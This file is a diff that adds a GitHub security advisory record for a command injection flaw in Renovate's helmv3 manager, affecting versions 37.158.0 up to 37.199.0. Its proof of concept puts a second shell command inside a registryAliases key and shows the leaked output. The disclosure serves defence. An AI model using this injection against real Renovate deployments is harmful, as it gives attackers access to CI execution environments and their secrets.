@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-rqgv-292v-5qgr",
+  "modified": "2024-04-23T16:21:10Z",
+  "published": "2024-04-23T16:21:09Z",
+  "aliases": [
+
+  ],
+  "summary": "Renovate vulnerable to arbitrary command injection via helmv3 manager and registryAliases",
+  "details": "### Summary\n\nAttackers with commit access to the default branch of a repo using Renovate could manipulate helmv3 registryAliases to execute arbitrary commands.\n\n### Details\n\nSince [#26848](https://github.com/renovatebot/renovate/pull/26848), `registryAliases` has become mergeable. This means that the helmv3 manager started honoring its value and uses a `helm repo add <key> <parameters>` command for each defined alias. See source code: https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80\nThe key was not quoted, leading to the ability to use variable references (`$FOO`) in it and have them printed by Renovate on the pull request, or even running any shell commands.\n\n### PoC\n\nInside a repository where Renovate runs, add a Helm chart with an outdated dependency, for example:\n\ntest-chart/Chart.yaml:\n\n```\napiVersion: v2\nname: redis\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 18.13.10\n    repository: oci://registry-1.docker.io/bitnamicharts\n```\n\ntest-chart/Chart.lock:\n\n```\ndependencies:\n- name: redis\n  repository: oci://registry-1.docker.io/bitnamicharts\n  version: 18.13.10\ndigest: sha256:11267bd32ea6c5c120ddebbb9f21e4a3c7700a961aa1a27ddb55df1fb8059a38\ngenerated: \"2024-02-16T13:31:20.807026334Z\"\n```\n\nThen add the following `renovate.json`:\n\n```json\n{\n  \"$schema\": \"https://docs.renovatebot.com/renovate-schema.json\",\n  \"extends\": [\n    \"config:base\"\n  ],\n  \"registryAliases\": {\n    \"foo/bar || sh -c 'ls /; exit 1' >&2\": \"registry.example.com/proxy\"\n  }\n}\n```\n\nOnce Renovate runs on the repository, it will create a pull request, and add a comment titled \"Artifact update problem\" containing the following text:\n\n```\nFile name: test-chart/Chart.lock\n\nCommand failed: helm repo add foo/bar || sh -c 'ls /; exit 1' >&2 registry.example.com/proxy --force-update\nError: \"helm repo add\" requires 2 arguments\n\nUsage:  helm repo add [NAME] [URL] [flags]\nbin\nboot\ndev\netc\ngo\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n```\n\nThis shows that the `ls` command executed successfully, and we can even see its output.\n\nNote that redirecting any output you want to see to stderr (`>&2`) and making sure the final command fails (`exit 1`) is required in this case, as Renovate only adds a comment if the command fails, and it contains only stderr (not stdout) output.\n\n### Impact\n\nAll Renovate versions from 37.158.0 up until 37.199.0 were affected. This vulnerability allows full access to Renovate's execution environment. The level of severity depends on how Renovate is deployed (Docker, Kubernetes, CI pipeline, ...) and whether Renovate is being offered to untrusted users/repositories.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "renovate"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "37.158.0"
+            },
+            {
+              "fixed": "37.199.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/renovatebot/renovate/security/advisories/GHSA-rqgv-292v-5qgr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/renovatebot/renovate/commit/1e941fd885c799f2d38f4084a6f4cb9438813c8f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/renovatebot/renovate"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-23T16:21:09Z",
+    "nvd_published_at": null
+  }
+}
